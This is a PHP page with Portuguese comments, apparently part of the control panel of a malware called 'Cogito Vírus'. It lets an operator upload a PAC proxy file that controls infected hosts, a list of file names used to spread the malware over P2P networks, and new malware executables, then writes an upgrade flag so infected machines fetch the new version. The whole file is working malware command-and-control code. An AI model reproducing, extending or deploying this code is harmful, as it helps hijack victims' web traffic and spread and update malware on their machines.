<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 3049580948934534.php / Atualizacoes.php ~~
//    Arquivo responsável pela atualização de alguns componentes do Malware.
//
// Descrição abaixo.
//    * Atualiza arquivo PAC de controle dos hosts.
//    * Atualiza lista com nomes de programas utilizados para compartilhar nas redes de compartilhamento de arquivos P2P.
//    * Atualiza versão do Cogito.
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }

	// Faz upload dos arquivos...
	if (isset($_FILES['filex']['name'])) {
		if ((!empty($_FILES["filex"])) && ($_FILES['uploaded_file']['error'] == 0)) {
			
			$filename = basename($_FILES['filex']['name']);
			$ext = substr($filename, strrpos($filename, '.') + 1);
			if (($ext == "pac") || ($ext == "txt") || ($ext == "exe")) {
				
				$Dir = getcwd();
				for ($x=0; ; $x++) {
					if ($Dir[$x] == 'h') {
						if ($Dir[$x+1] == 'o') {
							if ($Dir[$x+2] == 'm') {
								if ($Dir[$x+3] == 'e') {
									$Dir[$x]   = 'm'; $Dir[$x+1] = 'i';
									$Dir[$x+2] = 'd'; $Dir[$x+3] = 'i';
									break;
								}
							}
						}
					}
				}
				
				if ($Dir[strlen($Dir) - 1] == 'i') { $Dir = $Dir; }
				
				$IDX = $_POST["IDX"]; if ($IDX == 1) { $Dir = $Dir . "a/ETX/FLPACX"; }
				else if ($IDX == 2) { $Dir = $Dir . "a/ETX/FLPGGS"; }
				else if ($IDX == 3) { 
					$Dir = getcwd();
					for ($x=0; ; $x++) {
						if ($Dir[$x] == 'h') {
							if ($Dir[$x+1] == 'o') {
								if ($Dir[$x+2] == 'm') {
									if ($Dir[$x+3] == 'e') {
										$Dir[$x]   = 'm'; $Dir[$x+1] = 'o';
										$Dir[$x+2] = 'd'; $Dir[$x+3] = 'u';
					break; } } } } }
					$Dir = $Dir . "les/mupgrade/MWX/877458375382";

					$buf = "[CTL]\nID=1\n"; $file = fopen("../modules/mupgrade/CTL.ini", "w");
					if ($file) { fwrite($file, $buf); fclose($file); }
			
				}
				
				move_uploaded_file($_FILES['filex']['tmp_name'], $Dir); 
			}
		}
	}
?>
<html><head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
<title> Cogito V&iacute;rus :: Atualiza&ccedil;&otilde;es</title>
<link rel="shortcut icon" href="<?php echo $faviconGL; ?>" type="image/x-icon" />
<link href="../midia/SiteFL/style.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
<script type="text/javascript">
	$('#btn').live('click', function(){
		$('#file').click();
	})
	
	function SendIPX ( IDX ) {
		
		if (IDX == 1) {
			document.form.IDX.value = 1;
		} else if (IDX == 2) {
			document.form.IDX.value = 2;
		} else if (IDX == 3) {
			document.form.IDX.value = 3;
		}
		
		form.submit();
	}
</script>
</head><body>

<form name="form" method="post" enctype="multipart/form-data">
<input type="hidden" name="IDX" value="0" />
<center><pre><font style="color: white;"><?php echo $TopoMenu; ?><!-- Exibe topo e menu -->
|                 <font style="color: ;">||      ||                                ||      ||                                ||      ||                  |
|                 ||      ||                                ||      ||                                ||      ||                  |
|                 ||      ||                                ||      ||                                ||      ||                  |
|        .--------------------------.              .--------------------------.              .--------------------------.         |
|            Atualizar arquivo de                      Atualizar arquivo de                       Atualizar Versão do             |
|            controle dos hosts.                     controle de disseminação                         Cogito Vírus                |
|             [ <a href="#" id="btn" >UPLOAD</a> ] [ <a href="#" onclick="Javascript: SendIPX(1); return false;">OK</a> ]                          [ <a href="#" id="btn" >UPLOAD</a> ] [ <a href="#" onclick="Javascript: SendIPX(2); return false;">OK</a> ]                         [ <a href="#" id="btn" >UPLOAD</a> ] [ <a href="#" onclick="Javascript: SendIPX(3); return false;">OK</a> ]              |
|        '--------------------------'              '--------------------------'              '--------------------------'         |
|                                                                                                                                 |
|                                                                                                                                 |
|<font style="color: green;">'.</font>                                                                                                                             <font style="color: green;">.'</font>|
|<font style="color: green;">%!p_                                                                                                                          _q#</font>|
|<font style="color: green;">J</font>M@p<font style="color: green;">Y_                                                                                                                    _qKH </font>N<font style="color: green;">H</font>|
|<font style="color: green;">#</font>NPN!#<font style="color: green;">!p_                                                                                                              _q1F</font>,H HB<font style="color: green;">K</font>|
|<font style="color: green;">X</font>F`YM`Q,K<font style="color: green;">lp_                                                                                                        _ql</font>HN@Hz!H#Y<font style="color: green;">@</font>|
|<font style="color: green;">`N</font>.G,P,%R,_H<font style="color: green;">1p_                                                                                                  _1M</font>!%,G,HGjNKG_<font style="color: green;">L</font>|
|<font style="color: green;">Z</font>M#@F&`M$K`M,_J<font style="color: green;">'le_                                                                                           _qK</font>(g0,G5,P´*KeR^j<font style="color: green;">+</font>|
|<font style="color: green;">X</font>@L"N,_r.,H%JKH,71`F<font style="color: green;">|p_                                                                                   _qlH</font>o6i,F´7#,HOKHP.L;9<font style="color: green;">:</font>|
|<font style="color: green;">``</font>`#+#.``'F"'```'F,'<font style="color: green;">``'!p._                                                                           _.q!</font>'´´;,F'´´´'"H'´´.#+#´´<font style="color: green;">´</font>|
|   R  R   `Q,      `',   <font style="color: green;">`.F@;,_                                                                 _.:#H</font>.´    ,F´     ,K´   G  K   |
|<font style="color: green;">M</font>@0P#x!Qvr%`N,6+vxrd47`X,xzxx'J<font style="color: green;">,"Pp,_                                                       _,q0"</font>,X'xrvcx,K´ncvxr9,F´vxv,0´vsx#@<font style="color: green;">M</font>|
|´  `P´ `F,´  `"@´       `N´,      `.<font style="color: green;">M,;Zp,_                                           _,qZ1;"´</font>        _,F´      ,G´    ,H´ `0´  <font style="color: green;">`</font>|
|    K   `P,    `E,         `3,_        ´K,,_<font style="color: green;">`"p,__                            __,qK'"´</font>_,,H´        _,F´        ,Y´    ,N´   F    |
|    F     R      `O,          T';,r"´z""""`D',"´ _ <font style="color: green;">`"Pp,__              __,P"´</font> ´`"_,,Y´`""""z+v;_,H´         ,K´     ,E´    G    |
|    G      F,     ,,R,,,v"""""´´`V,            `Y'_´     <font style="color: green;">`'"Pp,_._,qR'"´´</font>     _,,X"´         _,U ´`'""'x,,,,H´      ,T´     N    |
|    !'    ,`D,;;"´'´`K'             `0,            `L,__ __,T"´ ``'"p,,_ _,,U"´           _,6´           ,K´``'"'x",W,     '!    |
|    'J;;"´'´`F,       `P,              `1,     ___,,K´  H',_      _,,q"'´`'"Np,__      _,8´            ,8´        ,0´`'"+'"J`'"<font style="color: green;">;;</font>|
|<font style="color: green;">;;</font>"´'K       `J,        `M,             .'D,J"""´´         _``4+R´_              ``'"K0,´_           ,7´         ,R´       K     |
|     F        `K          'R'     __,T"'´   `T,_        _,H"´   ``M,,_           _,G´     ``'"Xp,__,F´          ,k´        R     |
|     H         'Y,       __;'H,Y"´´            `Y,_ _,C"´             `P,,_   _,H´               ,Z``'"Yp,__   ,D´         G     |
|     5´          G`,_,,R'´    `M,´           _,7"`Y,_                     `7,G,,               ,N          `` ,P"Kp,__    ,K     |
|     K      __,,J´`F´           `O,     _,3"'´      `M,_                _,F´    `M,,_        ,H´             ,t´     ´``'"#p,__  |
|     `P,_,,Y´     `F´             `M,,N'´              `O,_          _,J´             `9,,_,P´              ,T´           Q'  `<font style="color: green;">`'</font>|
|  _,'´F´            R,         __,X´`F'                   `I,_    _,L´                   ,Y`7´,_           ,N´            F'     |
|<font style="color: green;">'´</font>´   K             'K     _,,Y"´    `M,                     `M,_F´                    ,L´       `M,,_    ,l´             G      |
|      L.             'H.;B""           `A,                 _,G´ `4;_                 ,G´               `jL´,             .J      |
|      'J          __,F´F.'               `M,            _,N´       `7,_            ,H´                 ,N´ ``M,_         T'      |
|       K     __,,F"´   `M,                 `F,        ,J´             `Q,_       ,T´                  <font style="color: green;">,O'        `#´,,_  S</font>       |
|      <font style="color: green;">,# ,,NV"'´        `M,                  `M,   ,N´                   `M,_ ,P´.</font>              <font style="color: #333333;"><font style="color: #666666;">N</font>etchar <font style="color: #666666;">T</font>eam - By Netvoid - <font style="color: #666666;">2013</font></font> |
|                                                                                                                                 |<?php echo $RodapeCV; ?> <!-- Exibe rodapé -->
</font></pre>
<input class="filex" id="file" type="file" name="filex" />
</center></form></body></html>
<?php
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
